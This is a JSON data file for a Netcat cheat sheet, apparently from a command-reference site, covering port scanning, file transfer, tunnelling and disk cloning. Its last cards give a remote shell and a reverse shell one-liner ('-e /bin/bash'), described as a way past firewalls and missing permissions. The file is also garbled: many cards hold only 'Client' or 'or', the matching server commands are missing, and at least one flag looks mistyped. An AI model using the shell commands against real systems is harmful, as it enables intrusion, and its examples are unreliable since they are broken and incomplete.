{
  "id": "nc",
  "metadata": {
    "title": "Netcat",
    "date": "2020-11-25T18:28:43.000Z",
    "background": "bg-blue-600",
    "tags": [
      "ncat",
      "nc",
      "utility",
      "network",
      "traffic"
    ],
    "categories": [
      "Linux Command"
    ],
    "intro": "This cheat sheet provides various for using Netcat on both Linux and Unix.",
    "plugins": [
      "copyCode"
    ]
  },
  "sections": [
    {
      "title": "Getting Started {.cols-5}",
      "level": 2,
      "cards": [],
      "subsections": [
        {
          "title": "Usage",
          "level": 3,
          "cards": [
            {
              "title": "Usage",
              "body": "```\nListen for incoming connections\n```",
              "footer": "shell script\n$ nc -lp port [host] [port]\n```",
              "spanConfig": "col-span-2",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Option examples",
          "level": 3,
          "cards": [
            {
              "title": "Option examples",
              "body": "| Option | Description                | Example                                  |\n| ------ | -------------------------- | ---------------------------------------- |\n| `-h`   | nc -h                      | Help                                     |\n| `-z`   | nc -z 192.168.1.9 1-100    | Port scan for a host or IP address       |\n| `-v`   | nc -zv 192.168.1.9 1-100   | Provide verbose output                   |\n| `-n`   | nc -zn 192.168.1.9 1-100   | Fast scan by disabling DNS resolution    |\n| `-l`   | nc -lp 8000                | TCP Listen mode _(for inbound connects)_ |\n| `-w`   | nc -w 180 192.168.1.9 8000 | Define timeout value                     |\n| `-k`   | nc -kl 8000                | Continue listening after disconnection   |\n| `-u`   | nc -u 192.168.1.9 8000     | Use UDP instead of TCP                   |\n| `-q`   | nc -q 1 192.168.1.9 8000   | Client stay up after EOF                 |\n| `-4`   | nc -4 -l 8000              | IPv4 only                                |\n| `-6`   | nc -6 -l 8000              | IPv6 only                                |",
              "footer": "",
              "spanConfig": "col-span-3 .row-span-2",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Chat client-server",
          "level": 3,
          "cards": [
            {
              "title": "Chat client-server",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc 192.168.1.9 8000\n```",
              "spanConfig": "col-span-2",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        }
      ]
    },
    {
      "title": "Netcat Examples",
      "level": 2,
      "cards": [],
      "subsections": [
        {
          "title": "Banner grabbing",
          "level": 3,
          "cards": [
            {
              "title": "Banner grabbing",
              "body": "```\nor\n```",
              "footer": "shell script\necho \"\" | nc -zv -wl 192.168.1.1 801-805\n```",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Port scanning",
          "level": 3,
          "cards": [
            {
              "title": "Port scanning",
              "body": "```\nScan ports 22, 3306 and 8080\n```",
              "footer": "shell script\n$ nc -zvn 192.168.1.1 22 3306 8080\n```",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Proxy and port forwarding",
          "level": 3,
          "cards": [
            {
              "title": "Proxy and port forwarding",
              "body": "```\nor\n```",
              "footer": "shell script\n$ nc -l 8001 | nc 127.0.0.1 8000\n```\nCreate a tunnel from one local port to another",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Download file",
          "level": 3,
          "cards": [
            {
              "title": "Download file",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc -nv 192.168.1.9 8000 > file.txt\n```\nSuppose you want to transfer a file “file.txt” from server A to client B.",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Upload file",
          "level": 3,
          "cards": [
            {
              "title": "Upload file",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc 192.168.1.9 8000 < file.txt\n```\nSuppose you want to transfer a file “file.txt” from client B to server A:",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Directory transfer",
          "level": 3,
          "cards": [
            {
              "title": "Directory transfer",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc -n 192.168.1.9 8000 | tar -xvf -\n```\nSuppose you want to transfer a directory over the network from A to B.",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Encrypt transfer",
          "level": 3,
          "cards": [
            {
              "title": "Encrypt transfer",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc 192.168.1.9 8000 | openssl enc -des3 -d -pass pass:password -out file.txt\n```\nEncrypt data before transfering over the network",
              "spanConfig": "col-span-2",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Clones",
          "level": 3,
          "cards": [
            {
              "title": "Clones",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc -n 192.168.1.9 8000 | dd of=/dev/sda\n```\nCloning a linux PC is very simple. Suppose your system disk is /dev/sda",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Video streaming",
          "level": 3,
          "cards": [
            {
              "title": "Video streaming",
              "body": "```\nClient\n```",
              "footer": "shell script {.wrap}\n$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -\n```\nStreaming video with netcat",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Remote shell",
          "level": 3,
          "cards": [
            {
              "title": "Remote shell",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc 192.168.1.9 8000\n```\nWe have used remote Shell using the telnet and ssh but what if they are not installed and we do not have the permission\nto install them, then we can create remote shell using netcat also.",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        },
        {
          "title": "Reverse shell",
          "level": 3,
          "cards": [
            {
              "title": "Reverse shell",
              "body": "```\nClient\n```",
              "footer": "shell script\n$ nc 192.168.1.9 8000 -v -e /bin/bash\n```\nReverse shells are often used to bypass the firewall restrictions like blocked inbound connections",
              "spanConfig": "",
              "isShortcutsCard": false
            }
          ],
          "subsections": []
        }
      ]
    }
  ]
}